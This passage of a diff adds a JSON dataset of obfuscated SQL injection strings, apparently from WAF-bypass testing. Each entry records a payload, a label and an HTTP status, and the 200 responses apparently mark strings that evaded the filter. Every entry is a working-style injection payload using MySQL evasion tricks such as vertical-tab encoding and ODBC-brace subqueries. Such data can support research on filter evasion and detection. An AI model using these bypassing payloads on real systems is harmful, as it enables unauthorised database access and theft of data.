+    "executable": false
+  },
+  {
+    "text": "0'or+!@<@+or+~+false=%0b(%7e+{`if`+1}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03864741325378418,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@!=1+||%0b~%0b{x+(select+1)}=1=%0b(~%0b{a%0b1}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03452944755554199,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@=1.%0bor+%7e%0b{x+(select+1)}=1>(!%0b{x+(select%0b1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03629469871520996,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+!@<@.%0b||+not+{x+(select%0b1)}=1<(~+false)+||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03352618217468262,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "6%27+or+!%0b{x%0b(select%0b1)}=1%3C(true)+||%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03198122978210449,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b1<@.+or%0b{x%0b(select%0b1)}=1=+(~+{`if`%0b1}=1)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.035752058029174805,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+@<@+or+not+{x+(select+1)}=1<(%7e%0b{x%0b(select%0b1)}=1)+or'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03212714195251465,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+!@<@%0b||%0b%7e+true=+(%7e+{a+1}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03730034828186035,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5%27%0bor+!+{a+1}=1<(%7e+0)+or%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.031339168548583984,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@.+or+~+{x%0b(select%0b1)}=1+is%0btrue+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03528475761413574,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b1<@.+||%0b%7e+true=%0b(~+{a+1}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.029882192611694336,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "8'%0bor%0b{x%0b(select+1)}=1>(not%0btrue)+or'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.035985469818115234,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "6'+or+not+0>(!+{x+(select%0b1)}=1)+||'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03077101707458496,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b1<@%0bor+!+{x%0b(select+1)}=1=+(not%0b{`if`+1}=1)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.04090094566345215,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b1<@%0b||+not+{x+(select+1)}=1=%0b(!~false)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03414154052734375,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b!@<@.%0bor%0b%7e%0b{a%0b1}=1>(not%0b{x+(select+1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.038994789123535156,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@%0bor%0bnot+{a%0b1}=1<(%7e+0)+||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.02770209312438965,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b@<@.%0b||+~+1-(not%0b{x%0b(select+1)}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03558206558227539,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b@<@%0bor%0b%7e%0b{x+(select%0b1)}=1=+(%7e%0b{x+(select+1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03768301010131836,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27+||+!%7efalse%3C(~+1)+or%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.030563831329345703,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1.%0b||%0b!%0b{x%0b(select%0b1)}=1%3C({x%0b(select%0b1)}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037320613861083984,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b!@<@.%0b||%0b!%0b{`if`%0b1}=1=%0b(!%0b{x+(select+1)}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.035492658615112305,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "6+or+not+{x+(select+1)}=1%3C(%7e%0bfalse)--+",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.032149314880371094,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5'+or%0b%7e%0b0=%0b(%7e%0b{a+1}=1)+or'0",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.035411834716796875,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=1+||+%7e+1>(!%0btrue)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03826713562011719,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b1<@+or%0bnot+{a%0b1}=1=+(!%0b{a+1}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.041680097579956055,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b1<@%0b||+!~0<(~%0b{x%0b(select%0b1)}=1)+or'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.033113956451416016,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b@<@.%0bor%0b!+true<(%7e+{x+(select%0b1)}=1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037091970443725586,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@=1+||%0b~+{`if`%0b1}=1>(!%0b{x+(select%0b1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.036622047424316406,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@=1%0b||%0b!%0b{x%0b(select+1)}=1%0bis+false+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.035422563552856445,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@+or+not+{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03365159034729004,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5%27%0bor+%7e+{x+(select+1)}=1-(!+{`if`+1}=1)%0bor%270",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03422713279724121,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+1<@%0b||%0bnot+true%3C(%7e%0b{a%0b1}=1)%0b||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03265690803527832,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "3%0bor+not%0b0=+({x%0b(select+1)}=1)%23",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03864645957946777,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+@<@.+||+!%0btrue<(~+{x+(select+1)}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03694462776184082,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||%0b@<@.+||+~+{x+(select%0b1)}=1=+(~+0)+or'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03800535202026367,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=1.%0bor%0b%7e%0bfalse=+(~%0b{a+1}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03699159622192383,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||+@<@.%0b||%0btrue=%0b(~+{x+(select+1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.033765316009521484,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+!@<@.%0b||%0b%7e+false=+(%7e%0b{x+(select%0b1)}=1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03046584129333496,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=1%0b||+~%0b{x+(select+1)}=1=+(~+{`if`%0b1}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.035364389419555664,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27||%0b!@<@%0bor%0b{x%0b(select%0b1)}=1-(not%0b{x%0b(select%0b1)}=1)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.031069040298461914,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "2'%0bor%0b!%7efalse<(~+{x%0b(select%0b1)}=1)+or'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03455328941345215,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "8%27%0bor+!+{a+1}=1=+(not%0b1)%0bor%270",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03429365158081055,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@=1%0b||%0b~%0b{x+(select+1)}=1=+({x+(select+1)}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.037268877029418945,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+@<@%0bor%0b!~0=%0b(!%0b{x+(select%0b1)}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03671002388000488,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1.%0b||+!%0b{x%0b(select+1)}=1<(%7e%0b{x%0b(select%0b1)}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03763890266418457,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+!@<@.+||%0b~+{x+(select%0b1)}=1=+(%7e%0b{x+(select%0b1)}=1)%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03809618949890137,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=1+||%0bnot+{x+(select%0b1)}=1<(~%0b0)%0b||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.031101703643798828,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0+||+~%0b{x+(select%0b1)}=1-(not+1)--+",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03669238090515137,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1.+||%0b~+1>(not%0btrue)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03925800323486328,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5+or%0bnot%0btrue=+(not%0b{a+1}=1)--+",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.032685041427612305,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "2'+or%0bnot%0btrue%3C(%7e%0b{a%0b1}=1)%0bor'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03281760215759277,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+@<@.%0bor+not+false=+(~%0b{a%0b1}=1)%0bor'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03931140899658203,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or+1<@+or%0b!+{x+(select+1)}=1<(~%0b{x%0b(select%0b1)}=1)+||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03200936317443848,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+1<@.%0bor+1=+({x%0b(select%0b1)}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03518033027648926,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'or%0b@<@%0bor%0b%7e+{a%0b1}=1>(not+{`if`%0b1}=1)%0b||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.02841472625732422,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "4+or+!%0b{x%0b(select+1)}=1%3C(!%0b0)+",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03224492073059082,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@=1.%0bor%0bnot+{`if`+1}=1=%0b(!+true)--+",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03748297691345215,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+@<@.+||%0b~+{`if`+1}=1=%0b(!+false)%0bor%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03310823440551758,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@%0b||+!+1%3C(~%0b{x+(select%0b1)}=1)+||'",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03075242042541504,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b1<@%0b||+~+{x%0b(select+1)}=1>(!+1)+||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.02945089340209961,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+1<@.%0b||%0b%7e+{a+1}=1=+({a+1}=1)+or%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0348508358001709,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5'%0b||+!%7efalse<(1)%0bor'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.03253459930419922,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@!=1%0bor%0bnot%0b{x+(select%0b1)}=1<(~+{x+(select+1)}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0367279052734375,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "9'+||+~+{x%0b(select%0b1)}=1>(not%7efalse)%0b||'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.031180858612060547,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@!=.1%0bor+not%0b{`if`+1}=1=%0b(!%0b{`if`+1}=1)+||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.036968231201171875,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'<@!=1.+or%0bnot%0b{x+(select+1)}=1%3C(~+{`if`%0b1}=1)--+",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.032558441162109375,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or+1<@%0bor%0bnot~0%3C({x%0b(select+1)}=1)+||%27",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.035317182540893555,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27<@!=1%0bor+not~false%3C(not+false)%0b||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03140759468078613,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "1'+or+~+{`if`+1}=1>(not+{x%0b(select+1)}=1)%0bor'0",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03569626808166504,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0'||+1<@%0b||+{a%0b1}=1+like+{x%0b(select+1)}=1%0b||'",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.035948991775512695,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "8%0bor+!%0b{x%0b(select+1)}=1=%0b(not%0b{`if`+1}=1)+",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.03949880599975586,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "5'%0bor+!%0b{x+(select+1)}=1<(%7e%0b{x+(select+1)}=1)+or'0",
+    "label": 0,
+    "status_code": 403,
+    "response_time": 0.033971548080444336,
+    "syntax_valid": true,
+    "executable": false
+  },
+  {
+    "text": "0%27or%0b1<@%0b||%0b%7e+{a+1}=1=%0b(~+{x+(select+1)}=1)+||%27",
+    "label": 1,
+    "status_code": 200,
+    "response_time": 0.0348813533782959,
+    "syntax_valid": true,
+    "executable": false
+  }
+]
